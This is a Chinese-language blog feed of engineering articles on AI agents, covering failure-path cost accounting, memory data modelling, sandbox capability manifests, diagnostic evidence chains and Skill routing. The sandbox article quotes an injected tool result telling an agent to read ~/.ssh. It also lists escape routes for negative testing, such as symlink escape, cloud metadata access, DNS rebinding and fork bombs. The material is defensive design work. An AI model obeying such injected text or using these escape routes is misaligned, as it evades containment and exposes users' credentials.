<p class="article-diagram-scroll"><img src="/images/articles/agent-cost-failure-path.svg" class="lazyload" data-srcset="/images/articles/agent-cost-failure-path.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 失败路径成本树"></p>
<span id="more"></span>

<h2 id="模型账单要包含所有-Attempts"><a href="#模型账单要包含所有-Attempts" class="headerlink" title="模型账单要包含所有 Attempts"></a>模型账单要包含所有 Attempts</h2><p>每次模型调用记录 input&#x2F;output&#x2F;reasoning&#x2F;cache tokens、provider&#x2F;model snapshot、price version、finish、latency 和 run&#x2F;step&#x2F;attempt。断流无最终 usage 时估算并标记，不从报表删除。</p>
<p>重试复制大上下文会让同一 token 反复计费。账本区分首次输入、cache hit、retry duplicated context 和新增信息。这样能看出失败重试贵在模型输出，还是每次重新发送 100k 上下文。</p>
<p>fallback 累加主&#x2F;备模型费用。最后由便宜模型成功，不代表整个路径便宜；最后由贵模型成功，也不代表便宜模型没有成本。</p>
<p>格式修复、summary&#x2F;compaction、judge&#x2F;evaluator 都是模型 attempts，不能藏在“平台成本”。按 role 分类，才能判断 evaluator-optimizer 循环是否值得。</p>
<h2 id="检索和工具成本同样进入-Run"><a href="#检索和工具成本同样进入-Run" class="headerlink" title="检索和工具成本同样进入 Run"></a>检索和工具成本同样进入 Run</h2><p>embedding、vector query、rerank、web&#x2F;file search、MCP calls、数据库查询、浏览器&#x2F;沙箱、代码执行和对象存储都可能按调用或资源计费。每项记录 unit、quantity、price snapshot 与 result。</p>
<p>工具失败也有成本。浏览器打开页面后被注入阻断，安全上是成功拦截，资源上仍花了浏览器时长；数据库计划检查拒绝大查询，成本小但不是零。安全拦截和无效浪费分开标签。</p>
<p>异步工具在 Agent 超时后可能继续运行。operation cost 仍回填原 Run，不能因为前端已结束变 orphan。取消延迟与后台残留资源单列。</p>
<p>共享资源按可解释规则分摊：沙箱容器时长、队列、trace storage、缓存。精确计量不到时标 allocated&#x2F;shared estimate，不伪装成实际 usage。</p>
<h2 id="人工与事故成本是质量信号"><a href="#人工与事故成本是质量信号" class="headerlink" title="人工与事故成本是质量信号"></a>人工与事故成本是质量信号</h2><p>正常审批是流程成本，不等于失败；因模型对象选错、工具状态不明、答案无证据而人工纠正，是 failure recovery cost。两者在 ledger 用 reason 区分。</p>
<p>人工时间可以用标准分钟成本或实际工时，重点看趋势，不制造假精确。一次高风险错误引发事故调查、数据回滚和沟通，单独关联 incident cost，不能被百万次便宜问答平均掉。</p>
<p>用户重复提问也是潜在失败信号。前一次回答不完整导致用户重试，若 session&#x2F;feedback 能关联，可估算 rework cost；但不能没有证据就把所有相似问题都算失败。</p>
<p>人工接管后任务完成，同时记录 automated outcome 与 final outcome。成本优化不能通过把更多困难任务静默推给人来实现。</p>
<h2 id="Failure-Waste-需要可计算定义"><a href="#Failure-Waste-需要可计算定义" class="headerlink" title="Failure Waste 需要可计算定义"></a>Failure Waste 需要可计算定义</h2><p>我把 waste 定义为没有贡献到最终验证结果、且可通过工程改进避免的成本。失败 attempt 不一定全是 waste：一次必要的反例搜索虽没进入报告，也提高了结论可信度。</p>
<p>可识别模式包括：相同 context&#x2F;tool arguments 重复；无新 evidence 的 Agent 循环；终态缺失导致全量重跑；已成功 operation 被再次调用；schema invalid 的多轮自修复；被裁剪掉的大量重复 chunks；deadline 后仍运行的资源。</p>
<p>每种模式有 detector 与 evidence。<code>no_progress_steps&gt;=3</code>、相同 argument hash、operation idempotency hit、context duplicate ratio、closed_without_finish，都能从 trace 计算。不要让模型自己判断“这次浪费了”。</p>
<p>Waste ratio 按任务桶和版本展示，辅助定位。高风险安全检查即使最终拒绝，也不应被视为浪费；成本治理不能激励绕过 guardrails。</p>
<h2 id="优化从最大的失败桶开始"><a href="#优化从最大的失败桶开始" class="headerlink" title="优化从最大的失败桶开始"></a>优化从最大的失败桶开始</h2><p>若成本主要来自断流重跑，修 SSE&#x2F;终态和 resumability；来自 invalid tool args，改善 schema&#x2F;semantic validator 与有限修复；来自大上下文重复，做 artifact cache&#x2F;compaction；来自循环，增加 progress&#x2F;stop rules；来自人工纠错，修对象解析或 evidence。</p>
<p>降低 max steps 会立刻省钱，也可能降低复杂任务成功率。每个优化同时看 verified success、risk gates、latency 与 cost，做同期 A&#x2F;B&#x2F;canary。</p>
<p>缓存命中要验证语义。复用错误工具结果虽然省钱，却扩大事故；cache key 绑定 Bundle、input、permission、source&#x2F;tool version 和 policy。数据新鲜度要求高的任务不盲目缓存。</p>
<p>路由层使用 Cost per Verified Success，平台层再看 failure waste composition。前者选模型，后者决定该修协议、上下文、工具还是流程。</p>
<h2 id="预算要在运行时可执行"><a href="#预算要在运行时可执行" class="headerlink" title="预算要在运行时可执行"></a>预算要在运行时可执行</h2><p>Run 有总 token&#x2F;tool&#x2F;time&#x2F;cost budget，分配到 steps&#x2F;workers。每次新 attempt 前估算剩余，无法在 deadline&#x2F;预算内完成就降级或明确停止，不先花完再告警。</p>
<p>高价值研究可以允许更多搜索，简单查询限制步骤。预算是 task&#x2F;risk policy，不由模型说“还需要再研究一下”自动扩大。人工批准额外预算生成新 decision。</p>
<p>实时预算使用估算，最终用 provider&#x2F;tool usage 对账。估算偏差按模型&#x2F;工具校准；价格更新版本化，历史账单保持当时价格，模拟可用统一价格重算。</p>
<p>告警不仅看金额。attempts per success、duplicate operations、orphan compute、human correction 和 unknown outcome 上升，常比账单总额更早暴露问题。</p>
<p>Agent 成本治理真正要优化的是可靠完成任务的路径。把失败 attempt、工具和人工都串回 Run，团队才知道钱花在哪个失败机制上，也不会用削弱验证和权限来换一张更好看的 token 报表。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://arxiv.org/abs/2305.05176">FrugalGPT：LLM cascade 的质量与成本优化</a></li>
<li><a href="https://opentelemetry.io/docs/specs/otel/trace/api/">OpenTelemetry Trace：Span、Event、Status 与资源属性</a></li>
<li><a href="https://sre.google/workbook/implementing-slos/">Google SRE Workbook：用用户结果定义 SLI&#x2F;SLO</a></li>
<li><a href="https://openai.com/index/new-tools-for-building-agents/">OpenAI 2025 Responses API：模型与内置工具的统一执行 primitive</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent 成本</tag>
        <tag>失败路径</tag>
        <tag>FinOps</tag>
      </tags>
  </entry>
  <entry>
    <title>Memory DB 不是一张 conversations 表：把事实、经历和索引分开建模</title>
    <url>//2026/02/23/memory-db-data-model/</url>
    <content><![CDATA[<p>把所有对话按用户 ID 存下来，再做 embedding，通常就被叫作“长期记忆”。这个方案演示很快，生产问题也来得快：用户改了偏好，旧片段仍被召回；一句推测被当成事实；删除账户后，向量索引里还残留副本。</p>
<p>Memory DB 不是消息归档的别名。它要管理记忆如何产生、依据什么、何时有效、与谁冲突、能否被检索、何时遗忘。原始经历、提炼事实和检索索引承担不同职责，不能混在一张 <code>conversations</code> 表里。</p>
<p class="article-diagram-scroll"><img src="/images/articles/memory-db-data-model.svg" class="lazyload" data-srcset="/images/articles/memory-db-data-model.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Memory 的分层数据模型"></p>
<span id="more"></span>

<h2 id="原始事件是证据，不直接等于记忆"><a href="#原始事件是证据，不直接等于记忆" class="headerlink" title="原始事件是证据，不直接等于记忆"></a>原始事件是证据，不直接等于记忆</h2><p>会话消息、工具调用、用户反馈、任务结果和人工修改先进入 append-only event store。事件保存主体、时间、来源、Run&#x2F;Step、内容引用、权限域与 retention class。它回答“当时发生了什么”，不保证每句话都真实。</p>
<p>模型说“用户喜欢 PostgreSQL”只是一次输出；用户明确说“以后 SQL 示例用 PostgreSQL”才是候选偏好；工具查到组织字段，也只能在授权范围和数据版本内使用。写入记忆前必须标 source type 与 evidence references。</p>
<p>大内容不复制到每条记录。附件、网页快照和工具结果放对象&#x2F;文档存储，事件保留不可变版本引用、摘要和 hash。这样重建时能找到原始材料，也能在删除时知道有哪些派生副本。</p>
<p>事件有自己的访问边界。A 项目的会话不能因为同一用户就被 B 项目召回，管理员调试记录也不能成为普通会话上下文。tenant、workspace、project、purpose 与 sensitivity 都是存储键的一部分，不是检索后的过滤补丁。</p>
<h2 id="事实、偏好和过程经验不是一种记录"><a href="#事实、偏好和过程经验不是一种记录" class="headerlink" title="事实、偏好和过程经验不是一种记录"></a>事实、偏好和过程经验不是一种记录</h2><p>我会至少拆三类可用记忆。Semantic memory 保存可陈述事实或偏好，如技术栈、术语映射、稳定的工作约束；episodic memory 保存一次任务怎样完成、遇到什么失败；procedural memory 保存经验证的流程、工具顺序和安全边界。</p>
<p>事实表用 canonical subject-predicate-object&#x2F;value 表达，并保存 <code>valid_from/valid_to</code>、confidence、evidence、extraction version 与 status。自然语言文本仍可保留，但不能只靠一段 summary 承载所有语义。用户明确修正时，旧事实结束有效期，新事实建立 supersedes 关系。</p>
<p>偏好带作用域和强度。“我这次想看 Java”不应升级为永久语言偏好；“所有生产命令先给只读版本”可以是全局工作习惯。提取器需要区分单次指令、阶段目标和长期偏好，低置信候选先不注入。</p>
<p>过程经验不直接变成 Skill。一次任务成功可能包含偶然步骤，至少要有多次证据、失败对照或人工确认，才能进入稳定 procedure。procedure 记录前置条件、动作、验收、风险和适用版本，避免把结果摘要当操作规范。</p>
<h2 id="冲突不是按最后更新时间覆盖"><a href="#冲突不是按最后更新时间覆盖" class="headerlink" title="冲突不是按最后更新时间覆盖"></a>冲突不是按最后更新时间覆盖</h2><p>Memory 最难的不是写入，而是新证据与旧记录矛盾。简单 last-write-wins 会让低可信的模型猜测覆盖用户明确声明，也会把某项目局部事实覆盖组织全局事实。</p>
<p>合并先比较主体、作用域、predicate 和有效时间，再根据 source authority、evidence quality 与 recency 判定。结果可以是 replace、coexist、pending conflict 或 reject。冲突无法自动解决时保留两份候选，在使用前询问或避免依赖。</p>
<p>数值和状态类事实通常 TTL 短，身份与工程习惯可能较长；法规、组织权限和数据口径需要来源版本。TTL 到期不是删除证据，而是从 active memory 退出，重新验证后生成新版本。</p>
<p>每次读取返回 <code>memory_id/version</code> 和 reason。Agent 最终回答若依赖某条记忆，trace 能指出它；用户说“这不是我的偏好”时，系统才知道改哪一条，而不是盲目清空全部聊天。</p>
<h2 id="向量索引只是读取投影"><a href="#向量索引只是读取投影" class="headerlink" title="向量索引只是读取投影"></a>向量索引只是读取投影</h2><p>向量、关键词、图关系和时间索引都是派生 projection，不是事实源。索引文档包含 memory version、权限 scope、validity、sensitivity 与删除 tombstone。召回后必须回源验证记录仍 active、仍授权、仍符合当前目的。</p>
<p>近似向量检索适合找语义相关候选，但对精确身份、时间与否定关系不可靠。“不再使用 MySQL”与“使用 MySQL”很相近，只有结构化 predicate 和有效期能区分。排序应综合语义、时效、权威、任务相关性和重复度。</p>
<p>上下文预算也会反向约束 Memory。不是召回越多越好。我会先选择可回答当前决策的最小事实集，再补少量相关经历；同一事实的十次重复证据用聚合引用表达，避免形成虚假的多数优势。</p>
<p>索引重建必须可重复。给定某一 memory snapshot 与 embedding&#x2F;index version，能生成同一逻辑集合；迁移时双写或离线构建、对比召回再切换。把向量库当唯一存储，一旦重嵌入或误删很难审计。</p>
<h2 id="删除、保留和评测要一起设计"><a href="#删除、保留和评测要一起设计" class="headerlink" title="删除、保留和评测要一起设计"></a>删除、保留和评测要一起设计</h2><p>用户删除一段会话，要沿 lineage 找到事件、抽取事实、摘要、embedding、缓存和训练&#x2F;评测副本。立即生成 tombstone 阻止读取，后台清理各投影并记录完成状态。备份按既定周期过期，不能宣称瞬间从所有介质消失。</p>
<p>“忘记这件事”还可能是语义撤回而非物理删除：用户要求不再使用某偏好，旧记录因审计保留但状态 revoked，不再进入上下文。产品需要把这两种操作说清楚。</p>
<p>Memory 评测分写入和读取。写入看事实抽取准确率、作用域、冲突处理、敏感信息误存；读取看必要事实召回、过期&#x2F;越权泄露、错误记忆影响和上下文成本。最终还要看任务结果，召回到正确事实却被模型忽略，同样是失败。</p>
<p>我会保留一套带时间演化的数据：先声明偏好、临时例外、明确修改、跨项目切换、撤回、账户删除。只测单轮问答命中率，发现不了 Memory DB 真正的生命周期问题。</p>
<p>一个能上线的 Memory 系统，首先是有来源、有版本、有权限、有遗忘机制的数据系统，然后才是检索功能。把这一层做清楚，Agent 才是在使用历史，而不是被旧聊天片段牵着走。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://arxiv.org/abs/2310.08560">MemGPT：用分层存储管理 LLM 上下文</a></li>
<li><a href="https://arxiv.org/abs/2304.03442">Generative Agents：观察、反思与规划式记忆</a></li>
<li><a href="https://www.nist.gov/privacy-framework">NIST Privacy Framework</a></li>
<li><a href="https://openlineage.io/docs/spec/object-model/">OpenLineage：用 Run、Job、Dataset 事件描述数据血缘</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Agent Memory</tag>
        <tag>Memory DB</tag>
        <tag>数据建模</tag>
      </tags>
  </entry>
  <entry>
    <title>执行型 Agent 的 Sandbox 为什么要有清单：能力不是一句‘已隔离’</title>
    <url>//2026/04/08/agent-sandbox-manifest/</url>
    <content><![CDATA[<p>“代码在容器里运行，所以是隔离的”这句话信息量很低。容器挂了哪些目录、能访问哪些网段、使用谁的云凭证、能否启动特权子进程、输出会被送到哪里，任何一项没说清，隔离都可能只是一层包装。</p>
<p>执行型 Agent 会读取仓库、安装依赖、运行命令、访问网站和调用工具。它的能力集合应该像部署规格一样被声明、审批和验证。我把这份契约叫 Sandbox Manifest：不是给人看的安全口号，而是运行时真正执行的清单。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-sandbox-manifest.svg" class="lazyload" data-srcset="/images/articles/agent-sandbox-manifest.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Sandbox Manifest 执行链"></p>
<span id="more"></span>

<h2 id="Manifest-先描述资产与信任边界"><a href="#Manifest-先描述资产与信任边界" class="headerlink" title="Manifest 先描述资产与信任边界"></a>Manifest 先描述资产与信任边界</h2><p>清单开头固定 task&#x2F;run、tenant、workspace、sandbox image digest、kernel&#x2F;runtime profile、policy version、创建者和过期时间。镜像不能只写 <code>python:latest</code>，需要不可变 digest 与软件物料；否则同一任务重放时，执行环境已经不是当时那一个。</p>
<p>输入按来源分级：用户上传、代码仓库、内部制品、互联网内容、系统注入的 secret。来自网页或仓库的文本都是不可信数据，不能因为它出现在 README、Issue 或工具描述中就升级成系统指令。</p>
<p>输出同样有边界：允许写工作目录、缓存目录和声明的 artifact path；禁止写宿主机敏感目录；导出的文件标 owner、classification、retention 与 hash。很多泄漏不是读权限过大，而是产物和日志被送到了不该去的地方。</p>
<p>Manifest 是 policy input，不由 Agent 自己生成后自动放行。Agent 可以提出 capability request，调度器根据任务类型、用户权限与组织策略收窄，最终签发不可变 manifest。运行中扩大权限必须形成新的审批决定。</p>
<h2 id="文件系统要声明读、写与持久化"><a href="#文件系统要声明读、写与持久化" class="headerlink" title="文件系统要声明读、写与持久化"></a>文件系统要声明读、写与持久化</h2><p>只写一个 workspace path 不够。我会把 mount 列成 source、target、mode、recursive、follow_symlink、classification。代码仓库通常只读挂载，实际修改在 copy-on-write 层；需要回写时，只允许明确文件集合或通过 patch&#x2F;artifact 审核。</p>
<p>符号链接、硬链接和相对路径必须在 sandbox 边界内解析。允许写 <code>/work/output</code>，如果它能指向 <code>/etc</code> 或宿主 socket，路径白名单就失效。每次文件操作使用规范化后的真实路径校验，压缩包解压还要防路径穿越。</p>
<p>临时目录和缓存也要有生命周期。共享 npm&#x2F;pip 缓存可能跨租户泄漏私有包名或恶意制品；完全不缓存又会推高延迟。可以按信任域分区、只读复用已验证制品，任务结束清理可写层，并记录清理结果。</p>
<p>secret 不以普通环境变量整包注入。按 Operation 短时挂载或由代理代签，限定 audience、scope 与 TTL；stdout&#x2F;stderr、trace 和 crash dump 做 secret scanning。Agent 不需要看到明文云密钥，只需要得到一次被授权的具体能力。</p>
<h2 id="网络能力默认不是“可上网”"><a href="#网络能力默认不是“可上网”" class="headerlink" title="网络能力默认不是“可上网”"></a>网络能力默认不是“可上网”</h2><p>网络清单列出 DNS policy、egress destinations、端口、协议、代理和最大流量。域名白名单还要防 DNS rebinding、重定向到私网、IPv6 绕过与解析后地址变化。最终连接前校验解析 IP，不允许访问 metadata service、控制面和内部保留网段。</p>
<p>访问互联网文档与向外发送数据是同一条 egress 通道。只允许 <code>https:*</code> 等于可以把源码和 secret 传到任意站点。任务若只需下载公开依赖，经过制品代理；需要浏览指定网页，限制目标域和请求方法；需要调用 SaaS，使用受控 connector。</p>
<p>入站端口默认关闭。Agent 启动本地预览服务时只绑定 sandbox loopback，通过受控 preview proxy 暴露；不能自动监听宿主 <code>0.0.0.0</code>。回调场景使用临时、认证、限时的入口，不开放永久公网端口。</p>
<p>网络日志记录目的域&#x2F;IP、字节数、Operation 与 policy decision，但避免无边界保存敏感 payload。命中拒绝策略时给出可诊断 reason，别让 Agent 把网络拒绝当成服务故障无限重试。</p>
<h2 id="进程、资源和系统调用同样要列清"><a href="#进程、资源和系统调用同样要列清" class="headerlink" title="进程、资源和系统调用同样要列清"></a>进程、资源和系统调用同样要列清</h2><p>Manifest 声明入口命令、允许的 executable&#x2F;hash、用户 ID、capabilities、seccomp profile、最大子进程、CPU、内存、磁盘、运行时间和文件描述符。禁止 privileged、宿主 PID&#x2F;network namespace、Docker socket 与不必要设备。</p>
<p>允许 shell 不代表允许所有命令。高风险环境可把常用操作封装成窄工具；通用编码沙箱仍可用 shell，但限制系统调用、挂载、网络和凭证，并在执行前对明显破坏性命令做 policy gate。字符串黑名单不能替代内核边界。</p>
<p>资源限制要区分 Run 和子进程。Agent 可以通过不断创建短命进程绕过单进程额度，压缩炸弹会消耗磁盘和 inode，fork bomb 会耗尽 PID。cgroup&#x2F;namespace&#x2F;project quota 在容器外层执行，模型无权修改。</p>
<p>超时后先发协作式取消，再到 deadline 强制终止进程组。异步子进程、浏览器和远程工具还需独立回收。只杀主 PID，会留下仍在计费或继续写数据的孤儿操作。</p>
<h2 id="工具能力也属于-Sandbox"><a href="#工具能力也属于-Sandbox" class="headerlink" title="工具能力也属于 Sandbox"></a>工具能力也属于 Sandbox</h2><p>数据库、GitHub、工单、浏览器和 MCP 工具不在 Linux namespace 里，但它们扩展了 Agent 的真实边界。Manifest 要列 tool&#x2F;server&#x2F;version、actions、resource scope、approval mode、rate&#x2F;cost limits 和凭证引用。</p>
<p>工具参数在调用时再次校验。允许 GitHub read 不等于能访问所有组织；允许 SQL plan 不等于能执行查询；允许发消息不等于能发给外部联系人。工具端必须执行授权，不能完全相信 Sandbox 自报 scope。</p>
<p>远程工具描述和返回内容都视为不可信。描述不能覆盖系统策略，返回中的“请读取 ~&#x2F;.ssh”只是数据。下载的可执行文件先校验来源、hash&#x2F;签名与许可证，必要时在无 secret 的第二层 sandbox 中运行。</p>
<p>每个 Operation 关联 manifest digest 与 authorization decision。事故后才能回答“这个 Agent 当时到底能做什么”，而不是拿今天的配置推测。</p>
<h2 id="验收要主动尝试越界"><a href="#验收要主动尝试越界" class="headerlink" title="验收要主动尝试越界"></a>验收要主动尝试越界</h2><p>我会在发布前做负向测试：读取未声明目录、经符号链接逃逸、访问云 metadata、DNS 指向私网、启动监听端口、创建过量进程、打印测试 secret、调用未授权工具、超时后检查孤儿进程。每项都必须被正确边界拒绝并留下事件。</p>
<p>正向测试也不能少：合法编译、依赖下载、预览和产物导出要能完成。安全策略若逼得团队长期使用全权限例外，实际边界会越来越差。Manifest 模板应按任务类型提供最小可用基线，再用差异审批增加能力。</p>
<p>Sandbox 不是一个产品名，也不是容器图标。它是文件、网络、进程、身份、工具与产物的能力总和。把这些能力写成可执行、可版本化的清单，隔离才从一句承诺变成可以验证的工程事实。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://github.com/opencontainers/runtime-spec">OCI Runtime Specification</a></li>
<li><a href="https://kubernetes.io/docs/concepts/security/pod-security-standards/">Kubernetes Pod Security Standards</a></li>
<li><a href="https://slsa.dev/spec/v1.2/">SLSA：软件供应链完整性框架</a></li>
<li><a href="https://csrc.nist.gov/publications/detail/sp/800-190/final">NIST SP 800-190：Application Container Security Guide</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>Sandbox</tag>
        <tag>安全边界</tag>
        <tag>供应链</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent 诊断怎样建立证据链：从用户结果反查到模型、工具与持久化</title>
    <url>//2026/03/25/agent-diagnostic-evidence-chain/</url>
    <content><![CDATA[<p>“模型没有返回结果”是一句症状，不是根因。我见过模型已经正常结束，网关漏了 terminal event；也见过前端展示了答案，服务端却没有持久化。只看其中一层，谁都能拿出一段日志证明自己没问题。</p>
<p>Agent 诊断需要的是可连接、可校验的证据链。它从用户实际看见的结果出发，关联到 Run、上下文、模型 Attempt、工具 Operation、流事件和最终存储，并明确哪一段是原始事实、哪一段是系统推断。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-diagnostic-evidence-chain.svg" class="lazyload" data-srcset="/images/articles/agent-diagnostic-evidence-chain.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent 诊断证据链"></p>
<span id="more"></span>

<h2 id="先定义要证明的命题"><a href="#先定义要证明的命题" class="headerlink" title="先定义要证明的命题"></a>先定义要证明的命题</h2><p>排查前先把问题写成可验证命题，例如：“Run R 在 12:31 调用模型 M，模型完整返回文本 X；网关转换时丢失 message_stop，所以客户端未收到终态。”这句话包含主体、时间、阶段、结果和因果候选，随后逐项找证据。</p>
<p>如果只说“可能是 SSE 有问题”，团队会各自搜索异常日志。诊断至少需要四个对照：provider 原始响应是否完整，转换后的事件是否完整，持久化结果是否完整，客户端收到并组装的内容是否完整。四处结果一致才可以排除协议链。</p>
<p>我会给每个结论标 evidence level：直接观测、关联推断、未验证假设。HTTP 状态、原始事件序列、数据库记录属于直接观测；“大概是网络抖动”没有链路数据，只能算假设。复盘里不能把后者写成已确认根因。</p>
<p>时间窗口也要固定。日志滚动、配置热更新、索引变化会让晚一点的查询得到另一套现场。先保存相关版本、原始片段和查询条件，再开始解释。</p>
<h2 id="关联标识要贯穿所有边界"><a href="#关联标识要贯穿所有边界" class="headerlink" title="关联标识要贯穿所有边界"></a>关联标识要贯穿所有边界</h2><p>最外层有 tenant&#x2F;session&#x2F;request&#x2F;run，工作流内部有 step&#x2F;attempt，外部副作用有 operation，权限有 decision，模型供应商还有 provider request id。它们不必合成一个巨长 ID，但要能通过结构化字段双向关联。</p>
<p>Trace span 很适合表达时序和父子关系，但不能承载所有业务事实。模型完整响应、工具参数和产物可能过大或敏感，放受控存储，span 记录引用、hash、大小和 redaction status。采样也不能让高风险失败恰好消失。</p>
<p>跨异步队列时传播 trace context，同时把 run&#x2F;step&#x2F;operation 写进消息体。只靠线程上下文，消息重试或延迟消费后就断链。第三方系统无法接受 trace header 时，在幂等键或 metadata 中传递稳定业务关联键。</p>
<p>关联本身要校验。相同 request id 被连接池误复用、客户端自报的 trace id 未经验证、日志把旧 MDC 带到新任务，都会制造假链。ID 的生成方、作用域、唯一性和信任边界要明确。</p>
<h2 id="原始证据与规范化事件同时保留"><a href="#原始证据与规范化事件同时保留" class="headerlink" title="原始证据与规范化事件同时保留"></a>原始证据与规范化事件同时保留</h2><p>模型网关会把不同供应商协议转换成统一事件。规范化方便分析，但转换器本身可能是故障点。我会在合规允许范围内保存原始响应摘要或加密引用，并保存 adapter version。仅保留转换后的 JSON，无法证明字段是上游缺失还是本地丢失。</p>
<p>工具调用同理。Agent 生成的原始 arguments、schema 校验后的参数、对象解析后的 resource ID、实际发往下游的请求和下游业务结果分别留痕。它们之间的差异正是诊断证据，不能只保存最终一份。</p>
<p>检索证据包括 query、filter、index&#x2F;source version、候选、rerank score 和实际注入 chunks。答案没引用某文档，可能是没召回、被权限过滤、被 rerank 丢弃、超过预算，或注入后模型未采用。没有各阶段集合就只能猜。</p>
<p>持久化记录保存写入版本和事务结果。前端收到的最后一个字符并不能证明对话库已提交；反过来数据库有完整答案，也不能证明客户端接收。两者用内容 hash、event range 和 terminal state 对照。</p>
<h2 id="用不变量比搜-ERROR-更可靠"><a href="#用不变量比搜-ERROR-更可靠" class="headerlink" title="用不变量比搜 ERROR 更可靠"></a>用不变量比搜 ERROR 更可靠</h2><p>很多失败没有 ERROR。SSE 正常关闭却缺终态，工具返回 200 但业务状态 unknown，Run 标 succeeded 而必需产物为空。诊断平台应持续检查跨层不变量。</p>
<p>典型不变量包括：每个终止 Run 恰有一个 terminal outcome；已开始的 Attempt 最终 completed&#x2F;failed&#x2F;cancelled&#x2F;unknown；tool call 有匹配 result 或明确未决状态；有副作用的 Operation 有 idempotency key 和 decision；最终输出 hash 与持久化版本一致。</p>
<p>流式协议还要验证序号单调、arguments delta 可组装为合法 JSON、内容结束先于整体终态、终态后无增量。连接关闭不是业务事件，不能用 EOF 猜成功。</p>
<p>不变量失败直接产生诊断事件，带相关 IDs 和最小证据，不等用户投诉才查。规则版本也要记录，避免今天的新检查去误判半年前的旧协议。</p>
<h2 id="根因要经过对照和修复验证"><a href="#根因要经过对照和修复验证" class="headerlink" title="根因要经过对照和修复验证"></a>根因要经过对照和修复验证</h2><p>先复现相同输入、Bundle 与版本；如果问题受外部数据影响，保存可替代的 fixture。然后只改变一个因素：绕过网关直连 provider、关闭流式改非流式、固定工具返回、切换 adapter version。对照结果决定故障在哪一段。</p>
<p>相关性不等于因果。某次发布后错误上升只是线索；需要对比新旧版本处理同一原始事件，或在 canary 回退后验证指标恢复。随手重启使问题消失，最多证明状态变化影响了症状。</p>
<p>修复后跑原失败样本、邻近边界样本和正常基线。协议问题验证完整事件序列，工具问题核对真实业务状态，检索问题核对候选与引用。只看页面能打开，不叫回归。</p>
<p>证据链还应支持“无法归因”。如果 provider 没给 request id、原始响应也未留存，就明确证据缺口，并补可观测能力。编一个听起来合理的网络原因，对下一次事故没有帮助。</p>
<p>Agent 系统的复杂性来自多个非确定组件串联。诊断并不是把日志堆进搜索引擎，而是让一次用户结果能沿稳定关系回到每个决定和事实。链条接上以后，团队争论会少很多，修复也能真正闭环。流式链路可以用 <a href="/2026/06/25/sse-event-invariants/">SSE 事件不变量</a>做协议级检查，修复结果再进入<a href="/2025/08/04/agent-regression-fixed-environment/">固定环境的 Agent 回归</a>。</p>
<h2 id="对照资料"><a href="#对照资料" class="headerlink" title="对照资料"></a>对照资料</h2><ul>
<li><a href="https://www.w3.org/TR/trace-context/">W3C Trace Context：跨系统传播 trace 标识</a></li>
<li><a href="https://opentelemetry.io/docs/specs/semconv/general/trace/">OpenTelemetry Trace Semantic Conventions</a></li>
<li><a href="https://opentelemetry.io/docs/specs/semconv/gen-ai/">OpenTelemetry GenAI Semantic Conventions</a></li>
<li><a href="https://sre.google/sre-book/effective-troubleshooting/">Google SRE Book：有效故障排查方法</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>故障诊断</tag>
        <tag>证据链</tag>
        <tag>Agent 可观测性</tag>
      </tags>
  </entry>
  <entry>
    <title>Agent Skill 怎样把隐性经验写成边界：不是再塞一段万能提示词</title>
    <url>//2026/04/15/agent-skill-explicit-boundary/</url>
    <content><![CDATA[<p>一个熟练工程师排查问题时，会自然地区分日志事实和猜测，先查对象再执行危险命令，修改后做回归。这些习惯平时藏在脑子里。把它们交给 Agent，如果只写“你是一名资深专家，请谨慎处理”，真正的边界一个都没留下。</p>
<p>Skill 的价值不是增加人设，而是把某一类任务的触发条件、操作顺序、证据标准、危险边界和验收方式写成可复用协议。它应该比大段系统提示更窄，也更容易评审和测试。</p>
<p class="article-diagram-scroll"><img src="/images/articles/agent-skill-explicit-boundary.svg" class="lazyload" data-srcset="/images/articles/agent-skill-explicit-boundary.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Agent Skill 的显式边界结构"></p>
<span id="more"></span>

<h2 id="先写清楚什么时候该用、什么时候不该用"><a href="#先写清楚什么时候该用、什么时候不该用" class="headerlink" title="先写清楚什么时候该用、什么时候不该用"></a>先写清楚什么时候该用、什么时候不该用</h2><p>好的 description 本质上是一份路由契约，不能写成功能列表。它包含用户会说的任务、关键对象和明确边界。例如“任务实例失败诊断、日志查看、重跑与停止”与“修改作业 SQL”看似都围绕任务，实际权限和证据完全不同，应由不同 Skill 处理。</p>
<p>触发过宽会抢走不相关任务，触发过窄又需要用户记住内部术语。我会用真实问法建一组正例、近邻负例和歧义例：哪些必须命中，哪些应路由给另一个 Skill，哪些必须先澄清对象。</p>
<p>边界还要写不支持项和移交目标。工具当前不能修改调度周期，就明确只能查询并引导页面操作，不让 Agent 猜接口。诊断 Skill 不应因为发现 SQL 问题就自动修改生产代码，除非用户授权的任务本来包含修复。</p>
<p>优先级冲突要显式解决。运行态问题优先运维 Skill，源码解释走开发 Skill，表字段走元数据 Skill。靠模型从两份重叠描述里临场选择，回归结果会随上下文漂移。</p>
